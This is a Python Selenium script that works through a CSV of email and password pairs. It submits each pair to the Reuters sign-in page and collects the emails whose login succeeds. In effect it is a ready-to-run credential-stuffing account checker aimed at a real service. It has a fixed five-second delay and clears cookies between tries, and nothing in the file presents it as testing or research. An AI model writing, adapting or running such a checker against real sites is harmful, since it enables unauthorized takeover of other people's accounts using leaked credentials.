import csv
import time
import os

from dotenv import load_dotenv

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By


load_dotenv()


def main():
    chrome_path = os.getenv("CHROME_PATH")
    options = Options()
    options.binary_location = chrome_path
    driver = webdriver.Chrome(options=options)
    valid_emails = set()

    csv_path = os.getenv("CSV_PATH_REUTERS")
    with open(csv_path) as file:
        reader = csv.reader(file, delimiter=';')
        for row in reader:
            email = row[0]
            password = row[1]

            print(f"Checking validity of {email}...")

            driver.get(url="https://www.reuters.com/account/sign-in")
            input_email = driver.find_element(by=By.ID, value="email")
            input_email.send_keys(email)
            input_password = driver.find_element(by=By.ID, value="password")
            input_password.send_keys(password)
            form = driver.find_element(by=By.TAG_NAME, value="form")
            form.submit()

            if "sign-in" not in driver.current_url:
                valid_emails.add(email)

            driver.delete_all_cookies()
            time.sleep(5)

    print(valid_emails)


if __name__ == "__main__":
    main()
